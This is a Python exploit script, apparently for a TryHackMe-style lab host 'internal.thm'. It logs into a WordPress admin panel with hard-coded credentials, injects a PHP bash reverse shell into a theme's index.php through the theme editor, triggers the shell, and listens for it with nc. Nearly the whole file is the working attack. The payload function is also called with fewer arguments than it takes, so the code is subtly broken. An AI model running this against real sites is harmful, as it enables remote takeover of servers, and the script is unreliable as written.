import requests
import re
import os

MYIP = "10.14.39.17"
MYPORT = 4242
find_nonce = re.compile(r'<input type="hidden" id="nonce" name="nonce" value="([^"]*)" />')
payload = lambda ip, port, nonce: {"nonce": nonce,
"_wp_http_referer": "/blog/wp-admin/theme-editor.php?file=index.php&theme=twentyseventeen",
"newcontent":
f"""
<?php get_header(); ?>
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{MYIP}/{MYPORT} 0>&1'");?>
HACKED
<?php
get_footer();""",
"action": "edit-theme-plugin-file",
"file": "index.php",
"theme": "twentyseventeen",
"docs-list": ""}

print("* Logging in")
login = requests.post("http://internal.thm/blog/wp-login.php", {
        "log": "admin",
        "pwd": "my2boys",
        "wp-submit": "Log In",
        "redirect_to": "http://internal.thm/blog/wp-admin/",
        "testcookie": 1
    })

print(login)

print("* Fetching theme-editor nonce")
theme_editor = requests.get("http://internal.thm/blog/wp-admin/theme-editor.php?file=index.php&theme=twentyseventeen", cookies=login.cookies)
nonce = find_nonce.search(theme_editor.text)[1]
print("* Poof")
theme_editor = requests.post("http://internal.thm/blog/wp-admin/admin-ajax.php", payload(nonce),cookies=login.cookies)
os.system("curl http://internal.thm/blog/ >/dev/null &")
os.system(f"nc -l -vv -p {MYPORT}")
